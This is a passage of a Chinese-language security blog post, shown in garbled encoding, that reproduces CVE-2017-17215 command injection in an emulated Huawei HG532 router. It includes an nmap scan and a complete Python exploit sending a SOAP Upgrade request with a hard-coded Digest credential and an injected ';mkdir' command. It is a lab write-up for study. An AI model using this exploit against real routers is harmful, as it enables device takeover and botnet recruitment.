<p>åœ¨å®¿ä¸»æœºä¸Šæ‰§è¡Œ <code>nmap -p- -Pn 192.168.110.112</code> ï¼Œå¯¹ <code>qemu</code> å¼€æ”¾çš„æ‰€æœ‰ç«¯å£è¿›è¡Œæ‰«æï¼Œæ­¤æ—¶ä¹Ÿèƒ½å¤Ÿçœ‹åˆ° <code>37215</code> æˆåŠŸçš„æš´éœ²äº†å‡ºæ¥</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252111532.png" alt="image-20231025211157380" style="zoom:50%;" />



<p>ä½¿ç”¨ <code>exp</code> è¿›è¡Œæ”»å‡»éªŒè¯ï¼Œå› ä¸ºæ‰¾äº†ä¸€ä¸‹éš”ç¦»ç¯å¢ƒä¸­å¯ç”¨çš„å‘½ä»¤ï¼Œå‘ç°æ²¡æœ‰ä»€ä¹ˆé€‚åˆåå¼¹ <code>shell</code> çš„ã€‚è¿™é‡Œå°±åªç”¨ <code>mkdir zikh26</code> åˆ›å»ºç›®å½•çš„å‘½ä»¤æ¥æ¼”ç¤ºä¸€ä¸‹æ•ˆæœå§</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">Authorization = <span class="string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Authorization&quot;</span>: Authorization&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-----CVE-2017-17215 HUAWEI HG532 RCE-----\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;s:Envelope s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;s:Body&gt;</span></span><br><span class="line"><span class="string">        &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;NewStatusURL&gt;;mkdir zikh26;&lt;/NewStatusURL&gt;</span></span><br><span class="line"><span class="string">            &lt;NewDownloadURL&gt;;mkdir ZIKH26;&lt;/NewDownloadURL&gt;</span></span><br><span class="line"><span class="string">        &lt;/u:Upgrade&gt;</span></span><br><span class="line"><span class="string">    &lt;/s:Body&gt;</span></span><br><span class="line"><span class="string">&lt;/s:Envelope&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://192.168.110.112:37215/ctrlt/DeviceUpgrade_1&#x27;</span>, headers = headers, data = data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nstatus_code: &quot;</span> + <span class="built_in">str</span>(r.status_code))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + r.text)</span><br></pre></td></tr></table></figure>



<p>è¿è¡Œ <code>exp.py</code> çš„æ—¶å€™ï¼Œå‘ç°è„šæœ¬å¡ä½äº†ï¼Œäºæ˜¯æˆ‘æ‰‹åŠ¨ <code>ctrl+c</code> ç»™é€€å‡ºäº†</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252119217.png" alt="image-20231025211956983" style="zoom:50%;" />



<p>ç¬¬äºŒæ¬¡è¿è¡Œçš„æ—¶å€™è¿˜æ˜¯å¡ä½ï¼Œç„¶åæˆ‘æƒ³ç€æ‰§è¡Œå‘½ä»¤ <code>nmap -p- -Pn 192.168.110.112</code> æ‰«ä¸€ä¸‹ï¼Œç¡®ä¿ç«¯å£è¿˜å¼€ç€ã€‚ç»“æœæ‰«äº†ä¸€ä¸‹ï¼Œ<code>exp.py</code> å°±æ­£å¸¸æ‰§è¡Œäº†â€¦ğŸ˜¶â€ğŸŒ«ï¸</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202310252125070.png" alt="image-20231025212554572"></p>
<h3 id="ç–‘é—®"><a href="#ç–‘é—®" class="headerlink" title="ç–‘é—®"></a>ç–‘é—®</h3><p>æ¼æ´åœ¨ <code>UPnP</code> é‡Œï¼Œå¯åŠ¨çš„æ˜¯ <code>mic</code> ã€‚é‚£è‚¯å®šæ˜¯ <code>mic</code> ç»è¿‡ä¸€ç³»åˆ—è°ƒç”¨åæ‰§è¡Œäº† <code>UPnP</code> ï¼Œä½†æ˜¯æˆ‘çœ‹äº†ä¸€ä¸‹ <code>mic</code> é‡Œçš„å­—ç¬¦ä¸²ï¼Œä»¥åŠ <code>UPnP</code> å­—ç¬¦ä¸²å­˜åœ¨çš„é‚£å‡ ä¸ªç¨‹åºï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°è¿™ä¹‹é—´çš„å…³ç³»ã€‚å› æ­¤è¿™æ¡æ¼æ´é“¾æœ€ç»ˆè§¦å‘çš„å®Œæ•´ç»†èŠ‚æˆ‘å¹¶æ²¡æ¢ç©¶æ¸…æ¥šï¼Œå†åŠ ç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°æœ‰æ–‡ç« å¯¹äºè¿™éƒ¨åˆ†çš„åˆ†æï¼Œé‚£å°±å…ˆâ€¦â€¦ğŸ¥´</p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://research.checkpoint.com/2017/good-zero-day-skiddie/">Huawei Home Routers in Botnet Recruitment - Check Point Research</a></p>
<p><a target="_blank" rel="noopener" href="https://www.iotsec-zone.com/article/384">ä¸€äº›ç»å…¸IoTæ¼æ´çš„åˆ†æä¸å¤ç°ï¼ˆæ–°æ‰‹å‘ï¼‰ - IOTsec-Zone</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/486923010">HG532eæ¼æ´å¤ç°(cve-2017-17215) - çŸ¥ä¹ (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/The54No1/article/details/129362750">HG532å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2017-17215ï¼‰_attifyos å¯†ç -CSDNåšå®¢</a></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/MIPS%E6%9E%B6%E6%9E%84/" rel="tag"># MIPSæ¶æ„</a>
              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/" rel="tag"># å‘½ä»¤æ³¨å…¥</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/posts/9a31f2d.html" rel="prev" title="2023å·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›â€”é¹åŸé”¦æ ‡èµ›å¤ç°-å·¥æ§maze">
                  <i class="fa fa-chevron-left"></i> 2023å·¥ä¸šä¿¡æ¯å®‰å…¨æŠ€èƒ½å¤§èµ›â€”é¹åŸé”¦æ ‡èµ›å¤ç°-å·¥æ§maze
                </a>
            </div>
            <div class="post-nav-item">
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

    </div>
  </footer>

  

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>





  <script src="/js/third-party/pace.js"></script>


  





</body>
</html>
